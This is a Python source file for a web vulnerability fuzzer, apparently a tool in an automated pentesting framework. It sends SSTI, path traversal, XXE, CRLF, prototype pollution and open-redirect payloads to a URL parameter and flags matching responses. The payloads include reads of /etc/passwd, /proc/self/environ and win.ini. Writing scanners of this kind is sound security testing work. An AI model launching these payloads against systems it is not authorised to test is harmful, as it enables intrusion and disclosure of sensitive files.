"""Parameter fuzzer — tests for SSTI, LFI, XXE, CRLF, prototype pollution, and more.

Inspired by Shannon's shannon-param-fuzz tool. Uses payloads from the existing
knowledge_base/vuln_patterns.py for comprehensive injection testing.
"""
from __future__ import annotations

import html
import re
from typing import Any, Dict, List
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse

from ..base import BaseTool, ToolResult, register
from .._http import normalise_target, request
from ...knowledge_base.vuln_patterns import VULN_PATTERNS


# Fuzz categories and their payloads
FUZZ_CATEGORIES = {
    "ssti": {
        "payloads": ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "{7*7}", "#{7*7}"],
        "detect": lambda body: "49" in body and "{{" not in body,
        "severity": "CRITICAL",
    },
    "lfi_unix": {
        "payloads": [
            "../../../../etc/passwd",
            "....//....//....//....//etc/passwd",
            "..%2f..%2f..%2f..%2fetc/passwd",
            "/proc/self/environ",
        ],
        "detect": lambda body: any(ind in body.lower() for ind in ["root:x:0:0", "path=", "home="]),
        "severity": "HIGH",
    },
    "lfi_windows": {
        "payloads": [
            "..\\..\\..\\..\\windows\\win.ini",
            "..%5c..%5c..%5c..%5cwindows\\win.ini",
        ],
        "detect": lambda body: any(ind in body.lower() for ind in ["[fonts]", "[extensions]", "[boot loader]"]),
        "severity": "HIGH",
    },
    "xxe": {
        "payloads": [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        ],
        "detect": lambda body: any(ind in body.lower() for ind in ["root:x:0:0", "entity", "system"]),
        "severity": "CRITICAL",
    },
    "crlf": {
        "payloads": ["%0d%0aX-Injected: true", "%0aX-Injected: true"],
        "detect": lambda body: "x-injected" in body.lower(),
        "severity": "MEDIUM",
    },
    "prototype_pollution": {
        "payloads": [
            '{"__proto__": {"polluted": true}}',
            "?__proto__[polluted]=true",
            "?constructor.prototype.polluted=true",
        ],
        "detect": lambda body: "polluted" in body.lower() or "[object object]" in body.lower(),
        "severity": "HIGH",
    },
    "open_redirect": {
        "payloads": [
            "//evil.example.com",
            "/\\evil.example.com",
            "//%09/evil.example.com",
        ],
        "detect": lambda body: "evil.example.com" in body.lower(),
        "severity": "LOW",
    },
}


@register
class ParamFuzzerTool(BaseTool):
    category = "vuln"

    @property
    def name(self) -> str:
        return "param_fuzzer"

    @property
    def description(self) -> str:
        return (
            "Fuzz parameters for injection vulnerabilities: SSTI, LFI, XXE, "
            "CRLF injection, prototype pollution, and open redirect. "
            "Uses knowledge base payloads for comprehensive testing."
        )

    def parameters_schema(self) -> Dict[str, Any]:
        return {
            "type": "object",
            "properties": {
                "url": {
                    "type": "string",
                    "description": "Target URL with parameters.",
                },
                "parameter": {
                    "type": "string",
                    "description": "Parameter name to fuzz.",
                },
                "method": {
                    "type": "string",
                    "enum": ["GET", "POST"],
                    "description": "HTTP method (default: GET).",
                },
                "fuzz_types": {
                    "type": "string",
                    "description": "Comma-separated fuzz types to test (default: all). Options: ssti,lfi_unix,lfi_windows,xxe,crlf,prototype_pollution,open_redirect.",
                },
            },
            "required": ["url", "parameter"],
        }

    def _run(self, **kwargs: Any) -> ToolResult:
        url = normalise_target(kwargs.get("url", ""))
        parameter = kwargs.get("parameter", "")
        method = (kwargs.get("method") or "GET").upper()
        fuzz_types_str = kwargs.get("fuzz_types", "")

        if not url or not parameter:
            return ToolResult(False, self.name, "url and parameter required", error="missing_args")

        # Determine which fuzz categories to test
        if fuzz_types_str:
            requested = set(fuzz_types_str.split(","))
            categories = {k: v for k, v in FUZZ_CATEGORIES.items() if k in requested}
        else:
            categories = FUZZ_CATEGORIES

        parsed = urlparse(url)
        base_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
        base_params.setdefault(parameter, "test")

        hits: List[Dict[str, Any]] = []
        total_tests = 0

        for cat_name, cat_config in categories.items():
            for payload in cat_config["payloads"]:
                total_tests += 1
                params = dict(base_params)
                params[parameter] = payload

                if method == "GET":
                    test_url = urlunparse(parsed._replace(query=urlencode(params, doseq=True)))
                    resp, err, elapsed = request("GET", test_url)
                else:
                    test_url = urlunparse(parsed._replace(query=""))
                    resp, err, elapsed = request("POST", test_url, data=params)

                if resp is None:
                    continue

                body = resp.text or ""
                if cat_config["detect"](body):
                    hits.append({
                        "type": cat_name,
                        "payload": payload[:100],
                        "status": resp.status_code,
                        "elapsed_ms": int(elapsed * 1000),
                        "response_size": len(body),
                        "severity": cat_config["severity"],
                    })
                    break  # One hit per category is enough

        success = bool(hits)
        hit_types = list({h["type"] for h in hits})
        summary = (
            f"Param fuzz: {len(hits)} vulnerabilities detected "
            f"in {total_tests} tests ({', '.join(hit_types)})"
            if success
            else f"Param fuzz: no vulnerabilities in {total_tests} tests"
        )

        return ToolResult(
            success=success,
            tool=self.name,
            summary=summary,
            parsed_data={
                "url": url,
                "parameter": parameter,
                "method": method,
                "total_tests": total_tests,
                "hits": hits,
                "vuln_types": hit_types,
                "severity": max((h["severity"] for h in hits), key=lambda s: {"INFO": 0, "LOW": 1, "MEDIUM": 2, "HIGH": 3, "CRITICAL": 4}.get(s, 0)) if hits else "INFO",
            },
            raw_output=str(hits)[:2000],
        )
